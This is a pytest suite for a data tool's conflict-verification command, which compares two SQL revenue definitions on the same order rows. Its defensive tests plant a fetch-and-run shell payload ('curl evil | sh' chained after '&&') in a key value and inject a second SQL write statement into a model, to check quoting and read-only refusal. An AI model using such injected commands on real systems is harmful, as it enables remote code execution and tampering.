"""`konstruct verify --conflicts`: each conflicting pair run on the same rows, and what differs."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any

import duckdb
import pytest

from konstruct import Project
from konstruct.analysis.conflict_data import (
    ConflictsOnData,
    PairOnData,
    SeedEngine,
    compare,
    conflicts_on_data,
)
from konstruct.analysis.query import QueryError
from konstruct.analysis.seedfiles import SeedFile, seed_files
from konstruct.analysis.verify import Candidate
from konstruct.interfaces.cli import main

# (id, customer_id, amount in cents, status)
ORDERS: list[tuple[int, int, int | None, str]] = [
    (1, 1, 1000, 'completed'),
    (2, 1, 2500, 'returned'),
    (3, 2, 700, 'completed'),
    (4, 2, 4000, 'returned'),
    (5, 3, 1200, 'completed'),
    (6, 3, None, 'completed'),
]

# Two revenue columns that differ by one filter.
SALES = """
create table main.sales as
select id as order_id, customer_id, amount / 100.0 as revenue
from raw.orders
"""
FINANCE = """
create table main.finance as
select id as order_id, customer_id, amount / 100.0 as revenue
from raw.orders
where status <> 'returned'
"""


def load(path: Path, orders: list[tuple[int, int, int | None, str]]) -> None:
    con = duckdb.connect(str(path))
    con.execute('create schema if not exists raw')
    con.execute(
        'create or replace table raw.orders (id integer, customer_id integer, amount integer, status varchar)'
    )
    if orders:
        con.executemany('insert into raw.orders values (?, ?, ?, ?)', orders)
    con.close()


def make_shop(
    root: Path, models: dict[str, str], orders: list[tuple[int, int, int | None, str]] = ORDERS
) -> Project:
    root.mkdir(parents=True, exist_ok=True)
    load(root / 'shop.duckdb', orders)
    for name, sql in models.items():
        (root / name).write_text(sql)
    project = Project(root)
    project.build()
    return project


def digest(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def pair(result: ConflictsOnData, first: str, second: str) -> PairOnData:
    """The pair of the two columns, whichever side each is on."""
    found = [p for p in result.pairs if {p.a, p.b} == {first, second}]
    assert len(found) == 1, [(p.a, p.b) for p in result.pairs]
    return found[0]


def sides(found: PairOnData, first: str) -> tuple[Any, Any]:
    """``found``'s counts of the rows only in ``first`` and only in the other column."""
    return (found.only_a, found.only_b) if found.a == first else (found.only_b, found.only_a)


@pytest.fixture(scope='module')
def shop(tmp_path_factory: pytest.TempPathFactory) -> Project:
    return make_shop(tmp_path_factory.mktemp('conflict_data'), {'sales.sql': SALES, 'finance.sql': FINANCE})


def run(project: Project, **options: Any) -> ConflictsOnData:
    return conflicts_on_data(project.graph, project.root, project.root / 'shop.duckdb', **options)


def test_two_revenue_columns_that_differ_by_one_filter(shop: Project) -> None:
    """Acceptance: by the order they share, the filter leaves two orders out of one side, and the
    totals differ by those orders' revenue."""
    result = run(shop)
    found = pair(result, 'sales.revenue', 'finance.revenue')
    assert found.skipped is None
    assert found.key == 'order_id'
    assert found.matched == 4 and found.differ == 0
    assert sides(found, 'sales.revenue') == (2, 0)
    totals = {found.a: found.total_a, found.b: found.total_b}
    assert totals == {'sales.revenue': 94.0, 'finance.revenue': 29.0}
    assert found.agrees is False
    # The largest difference first, each with the key and both values.
    values = {found.a: 'a', found.b: 'b'}
    shown = [
        (e.key, getattr(e, values['sales.revenue']), getattr(e, f'in_{values["finance.revenue"]}'))
        for e in found.examples
    ]
    assert shown == [(4, 40.0, False), (2, 25.0, False)]
    text = str(result)
    assert '2 rows of order_id only in sales.revenue' in text
    assert 'totals 94 and 29' in text or 'totals 29 and 94' in text
    assert 'konstruct verify --why finance.revenue --where order_id=4' in text
    assert "- filter only in finance.revenue: WHERE orders.status <> 'returned'" in text


def test_the_pair_is_counted_against_a_hand_computation_on_any_data(tmp_path: Path) -> None:
    """The counts are what a direct query of the source rows gives."""
    orders = [
        (i, i % 4, (i * 37) % 900 if i % 7 else None, 'returned' if i % 5 == 0 else 'completed')
        for i in range(1, 61)
    ]
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'finance.sql': FINANCE}, orders)
    found = pair(run(project), 'sales.revenue', 'finance.revenue')
    returned = [o for o in orders if o[3] == 'returned']
    assert sides(found, 'sales.revenue') == (len(returned), 0)
    assert found.matched == len(orders) - len(returned) and found.differ == 0
    total = {found.a: found.total_a, found.b: found.total_b}
    assert total['sales.revenue'] == pytest.approx(sum(o[2] or 0 for o in orders) / 100)
    kept = sum(o[2] or 0 for o in orders if o[3] != 'returned') / 100
    assert total['finance.revenue'] == pytest.approx(kept)
    assert len(found.examples) == 5


def test_two_definitions_that_agree_on_the_data_say_so(tmp_path: Path) -> None:
    """With no returned order the filter removes nothing: the two agree, and that is reported."""
    orders = [o for o in ORDERS if o[3] != 'returned']
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'finance.sql': FINANCE}, orders)
    result = run(project)
    found = pair(result, 'sales.revenue', 'finance.revenue')
    assert found.agrees is True and found.examples == []
    assert found.matched == 4 and found.differ == 0 and found.only_a == found.only_b == 0
    assert 'agree on every one of the 4 order_id' in str(result)
    assert result.summary().startswith('1 conflicting pair run')
    assert '0 disagree on the data, 1 agrees' in result.summary()


def test_values_that_differ_on_the_same_key(tmp_path: Path) -> None:
    gross = (
        'create table main.gross as select id as order_id, amount / 100.0 * 1.1 as revenue from raw.orders'
    )
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'gross.sql': gross})
    found = pair(run(project), 'sales.revenue', 'gross.revenue')
    # Order 6 has no amount on either side, which is the same value.
    assert found.matched == 6 and found.differ == 5 and found.only_a == found.only_b == 0
    assert [e.key for e in found.examples] == [4, 2, 5, 1, 3]
    assert 'gross.revenue' in found.summary() and '5 of the 6' in found.summary()


def test_with_no_key_in_common_only_the_totals_are_compared(tmp_path: Path) -> None:
    by_status = (
        'create table main.by_status as select status, sum(amount) / 100.0 as revenue '
        'from raw.orders group by status'
    )
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'by_status.sql': by_status})
    found = pair(run(project), 'sales.revenue', 'by_status.revenue')
    assert found.key is None and found.matched is None and found.examples == []
    assert found.total_a == found.total_b == 94.0
    assert {found.rows_a, found.rows_b} == {6, 2}
    assert found.agrees is True
    assert 'no column identifies the rows of both' in found.summary()


def test_a_model_that_is_not_a_single_select_is_refused(
    shop: Project, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Nothing of a pair runs unless both sides are one query that only reads."""
    import konstruct.analysis.conflict_data as module

    written = tmp_path / 'written.csv'
    from konstruct.analysis.verify import candidates as real

    def poisoned(graph: Any, root: Path) -> list[Candidate]:
        found = real(graph, root)
        return [
            Candidate(c.node, f"select 1 as revenue; copy (select 1) to '{written}'", None, None)
            if c.node.name == 'finance'
            else c
            for c in found
        ]

    monkeypatch.setattr(module, 'candidates', poisoned)
    found = pair(run(shop), 'sales.revenue', 'finance.revenue')
    assert found.skipped is not None
    assert 'finance is not a query that only reads: the model is 2 statements' in found.skipped
    assert found.agrees is None
    assert not written.exists()


def test_the_warehouse_is_unchanged_by_a_run(shop: Project) -> None:
    warehouse = shop.root / 'shop.duckdb'
    before = digest(warehouse)
    result = run(shop)
    assert result.pairs and all(p.skipped is None for p in result.pairs)
    assert digest(warehouse) == before


def test_the_sources_are_copied_once_and_read_through_the_sandbox(shop: Project) -> None:
    """Both sides read the same copy of each source: the run reads raw.orders once."""
    result = run(shop)
    assert result.sources == ['shop.raw.orders']
    assert not result.sampled


def test_a_source_over_the_row_limit_is_a_sample(shop: Project) -> None:
    result = run(shop, max_rows=3)
    assert result.sampled
    assert 'a sample' in str(result)


def test_a_missing_source_skips_the_pair_with_the_reason(tmp_path: Path) -> None:
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'finance.sql': FINANCE})
    empty = tmp_path / 'empty.duckdb'
    duckdb.connect(str(empty)).close()
    found = pair(conflicts_on_data(project.graph, project.root, empty), 'sales.revenue', 'finance.revenue')
    assert found.skipped is not None and 'cannot read' in found.skipped and 'raw.orders' in found.skipped


def test_compare_counts_keys_and_orders_examples_by_the_size_of_the_difference() -> None:
    a = (['k', 'v'], [(1, 10), (2, 20), (3, 30), (4, None)])
    b = (['k', 'v'], [(1, 10), (2, 25), (5, 7), (4, None)])
    found = compare(a, b, 'k', 'v', 'v', limit=5)
    assert found.matched == 3 and found.differ == 1 and found.only_a == 1 and found.only_b == 1
    assert [(e.key, e.a, e.b) for e in found.examples] == [(3, 30, None), (5, None, 7), (2, 20, 25)]
    assert found.total_a == 60 and found.total_b == 42


def test_compare_treats_one_and_one_point_zero_as_the_same() -> None:
    found = compare((['k', 'v'], [(1, 1)]), (['k', 'v'], [(1, 1.0)]), 'k', 'v', 'v', limit=5)
    assert found.differ == 0 and found.examples == []


def test_to_dict_is_plain_data(shop: Project) -> None:
    data = run(shop).to_dict()
    json.dumps(data)
    [entry] = data['pairs']
    assert {'idea', 'a', 'b', 'key', 'matched', 'differ', 'only_a', 'only_b', 'total_a', 'total_b'} <= set(
        entry
    )
    assert entry['examples'][0]['key'] == 4 and entry['agrees'] is False


def test_limit_and_models_choose_the_pairs(tmp_path: Path) -> None:
    gross = (
        'create table main.gross as select id as order_id, amount / 100.0 * 1.1 as revenue from raw.orders'
    )
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'finance.sql': FINANCE, 'gross.sql': gross})
    assert len(run(project).pairs) == 3
    assert len(run(project, limit=1).pairs) == 1
    only = project.verify_conflicts(models=['gross'], write=False)
    assert all('gross.revenue' in (p.a, p.b) for p in only.pairs) and len(only.pairs) == 2


def test_no_conflict_runs_nothing(tmp_path: Path) -> None:
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES})
    result = run(project)
    assert result.pairs == [] and result.summary() == 'No conflicting definitions to run on the data.'


# Seeds


def test_a_seed_engine_reads_csv_files_and_then_reads_no_other_file(tmp_path: Path) -> None:
    seed = tmp_path / 'orders.csv'
    seed.write_text('id,amount\n1,10\n2,20\n')
    other = tmp_path / 'other.csv'
    other.write_text('x\n1\n')
    engine = SeedEngine(None, tmp_path, {'db.main.orders': SeedFile('db.main.orders', 'orders.csv')})
    try:
        engine.start()
        table, columns = engine.copy('db.main.orders', 0, 100)
        assert [c for c, _ in columns] == ['id', 'amount']
        assert engine.run(f'SELECT sum(amount) FROM {table}')[1] == [(30,)]
        with pytest.raises(LookupError, match='not a seed'):
            engine.table('db.main.customers')
        with pytest.raises(Exception, match=r'disabled|Permission'):
            engine.run(f"SELECT * FROM read_csv('{other}')")
    finally:
        engine.close()
    assert engine.label == 'the seed orders, read from its CSV file'


def test_a_warehouse_without_the_seed_tables_reads_the_seeds(tmp_path: Path) -> None:
    seed = tmp_path / 'orders.csv'
    seed.write_text('id,amount\n1,10\n')
    warehouse = tmp_path / 'db.duckdb'
    con = duckdb.connect(str(warehouse))
    con.execute('create table main.customers as select 1 as id')
    con.close()
    seeds = {key: SeedFile(key, 'orders.csv') for key in ('db.main.orders', 'db.main.customers')}
    engine = SeedEngine(warehouse, tmp_path, seeds)
    try:
        assert engine.table('db.main.customers') == '"db"."main"."customers"'
        assert engine.table('db.main.orders').startswith('kp_seed.')
    finally:
        engine.close()
    assert engine.label == 'db.duckdb, with the seed orders read from its CSV file'


def test_seed_files_are_the_seeds_inside_the_project(tmp_path: Path) -> None:
    from konstruct.core.graph import Graph, Node

    (tmp_path / 'seeds').mkdir()
    (tmp_path / 'seeds' / 'raw.csv').write_text('a\n1\n')
    graph = Graph()
    graph.add_node(Node('seed.p.raw', 'seed', 'raw', relation='db.main.raw', path='seeds/raw.csv'))
    graph.add_node(Node('seed.p.gone', 'seed', 'gone', relation='db.main.gone', path='seeds/gone.csv'))
    graph.add_node(Node('seed.p.out', 'seed', 'out', relation='db.main.out', path='../outside.csv'))
    (tmp_path.parent / 'outside.csv').write_text('a\n1\n')
    assert seed_files(graph, tmp_path) == {'db.main.raw': SeedFile('db.main.raw', 'seeds/raw.csv')}


def test_no_warehouse_and_no_seeds_is_an_error(tmp_path: Path) -> None:
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'finance.sql': FINANCE})
    (project.root / 'shop.duckdb').unlink()
    with pytest.raises(QueryError, match='needs the data'):
        conflicts_on_data(project.graph, project.root, None)


# The CLI and the example


def test_the_cli_runs_the_pairs_and_writes_the_result(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    project = make_shop(tmp_path / 'shop', {'sales.sql': SALES, 'finance.sql': FINANCE})
    assert main(['--no-color', 'verify', '--conflicts', '-C', str(project.root)]) == 0
    out = capsys.readouterr().out
    assert 'Conflicting definitions on the data' in out and 'only in sales.revenue' in out
    written = json.loads((project.out_dir / 'conflict_data.json').read_text())
    assert written['format_version'] == 1 and written['pairs'][0]['differ'] == 0
    assert main(['--no-color', 'verify', '--conflicts', '--strict', '-C', str(project.root)]) == 1
    capsys.readouterr()
    assert main(['verify', '--conflicts', '--json', '-C', str(project.root)]) == 0
    assert json.loads(capsys.readouterr().out)['pairs'][0]['key'] == 'order_id'


def test_the_cli_refuses_conflicts_with_another_mode(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert main(['verify', '--conflicts', '--laws', '-C', str(tmp_path)]) == 2
    assert 'separate modes of verify' in capsys.readouterr().err


@pytest.mark.dbt
def test_the_example_reports_its_two_order_amounts_on_the_data(jaffle_built_graph: Path) -> None:
    """jaffle_shop's finance_orders leaves out returned orders, which orders.amount counts: the run
    finds exactly the orders a direct query of the warehouse does."""
    con = duckdb.connect(str(jaffle_built_graph / 'jaffle_shop.duckdb'), read_only=True)
    try:
        [(left_out, removed)] = con.execute(
            "select count(*), sum(amount) from main.orders where status in ('returned', 'return_pending')"
        ).fetchall()
        [(orders, total)] = con.execute('select count(*), sum(amount) from main.orders').fetchall()
    finally:
        con.close()
    result = Project(jaffle_built_graph).verify_conflicts(write=False)
    found = pair(result, 'orders.amount', 'finance_orders.order_value')
    assert found.key == 'order_id'
    assert sides(found, 'orders.amount') == (left_out, 0)
    assert found.matched == orders - left_out and found.differ == 0
    totals = {found.a: found.total_a, found.b: found.total_b}
    assert totals['orders.amount'] == pytest.approx(total)
    assert totals['finance_orders.order_value'] == pytest.approx(total - removed)


@pytest.mark.dbt
def test_the_example_from_its_seeds_alone_gives_the_same_answer(
    jaffle_built_graph: Path, tmp_path: Path
) -> None:
    """With no tables in the warehouse, as after a first `dbt docs generate`, the seeds are read
    from their CSV files, and the pair differs on the same orders."""
    import shutil

    copy = tmp_path / 'jaffle_shop'
    shutil.copytree(jaffle_built_graph, copy)
    (copy / 'jaffle_shop.duckdb').unlink()
    duckdb.connect(str(copy / 'jaffle_shop.duckdb')).close()
    project = Project(copy)
    seeded = project.verify_conflicts(write=False)
    built = Project(jaffle_built_graph).verify_conflicts(write=False)
    assert 'seed' in seeded.warehouse
    first, second = seeded.pairs[0], built.pairs[0]
    assert (first.a, first.b, first.matched, first.only_a, first.only_b, first.total_a, first.total_b) == (
        second.a,
        second.b,
        second.matched,
        second.only_a,
        second.only_b,
        second.total_a,
        second.total_b,
    )
    (copy / 'jaffle_shop.duckdb').unlink()
    assert project.verify_conflicts(write=False).warehouse.startswith('the seeds ')


@pytest.mark.dbt
def test_the_command_a_pair_suggests_runs_on_the_seeds_alone(
    jaffle_built_graph: Path, tmp_path: Path
) -> None:
    """The `verify --why` a pair ends with reads the seeds too, so it runs before anything is built."""
    import shutil

    from konstruct.analysis.why import parse_where

    copy = tmp_path / 'jaffle_shop'
    shutil.copytree(jaffle_built_graph, copy)
    (copy / 'jaffle_shop.duckdb').unlink()
    project = Project(copy)
    found = project.verify_conflicts(write=False).pairs[0]
    command = found.next_command()
    assert command is not None
    _, _, _, column, where = command.split(' ', 4)
    rows = project.why(column, parse_where([where.removeprefix('--where ')]))
    assert rows.matches == 0 and rows.excluded
    assert rows.warehouse.startswith('the seeds ')
    assert {e.reason.split(': ', 1)[0] for e in rows.excluded} == {'finance_orders'}


def test_the_totals_of_averages_are_not_compared(tmp_path: Path) -> None:
    """An average or a maximum does not add up over rows: with no shared key, the two are not
    comparable, and with one, only the values by key are."""
    by_customer = (
        'create table main.by_customer as select customer_id, avg(amount) / 100.0 as avg_value '
        'from raw.orders group by customer_id'
    )
    by_status = (
        'create table main.by_status as select status, avg(amount) / 100.0 as avg_value from raw.orders '
        "where status <> 'returned' group by status"
    )
    project = make_shop(tmp_path / 'shop', {'c.sql': by_customer, 's.sql': by_status})
    found = pair(run(project), 'by_customer.avg_value', 'by_status.avg_value')
    assert found.additive is False and found.key is None
    assert found.agrees is None and found.totals() is None
    assert found.summary().startswith('not comparable without a shared key')
    data = found.to_dict()
    assert data['additive'] is False and data['agrees'] is None


def test_a_planted_key_in_a_recorded_run_is_quoted_in_the_command(shop: Project) -> None:
    """The command a pair ends with quotes what it reads from the data and from the file."""
    found = pair(run(shop), 'finance.revenue', 'sales.revenue')
    found.examples[0].key = '23 && curl evil | sh'
    command = found.next_command()
    assert command is not None
    assert command.endswith("--where 'order_id=23 && curl evil | sh'")


@pytest.mark.postgres
def test_the_example_on_postgres_gives_the_answer_duckdb_gives(tmp_path: Path) -> None:
    """jaffle_shop built on Postgres with dbt-postgres: the pair runs read-only in a rolled-back
    transaction, with the same rows only one side has and the same totals as on DuckDB, and
    nothing left behind."""
    import shutil
    import uuid
    from urllib.parse import urlparse

    import psycopg

    from .conftest import EXAMPLE, run_dbt
    from .test_warehouse import require

    dsn = require('KONSTRUCT_TEST_PG_DSN')
    url = urlparse(dsn)
    schema = f'kc_{uuid.uuid4().hex[:8]}'
    root = tmp_path / 'shop'
    shutil.copytree(
        EXAMPLE, root, ignore=shutil.ignore_patterns('target', 'logs', 'konstruct-out', '*.duckdb', 'dags')
    )
    (root / 'profiles.yml').write_text(
        'jaffle_shop:\n  target: dev\n  outputs:\n    dev:\n      type: postgres\n'
        f'      host: {url.hostname}\n      port: {url.port or 5432}\n      user: {url.username}\n'
        f'      password: {url.password}\n      dbname: {url.path.lstrip("/")}\n      schema: {schema}\n      threads: 4\n'
    )
    try:
        run_dbt(root, 'build')
        run_dbt(root, 'docs', 'generate')
        project = Project(root)
        project.build(run_dbt=False)
        result = project.verify_conflicts(warehouse=dsn, write=False)
        assert result.warehouse.startswith('postgres database')
        [found] = result.pairs
        assert found.skipped is None, found.skipped
        assert (found.a, found.b) == ('finance_orders.order_value', 'orders.amount')
        assert found.key == 'order_id' and found.only_b == 6 and found.only_a == 0 and found.differ == 0
        assert (found.total_a, found.total_b) == (1585, 1672)
        with psycopg.connect(dsn) as con:
            leftovers = con.execute("select count(*) from pg_class where relname like 'kp_%'").fetchone()
        assert leftovers == (0,)
    finally:
        with psycopg.connect(dsn, autocommit=True) as con:
            con.execute(f'drop schema if exists {schema} cascade')
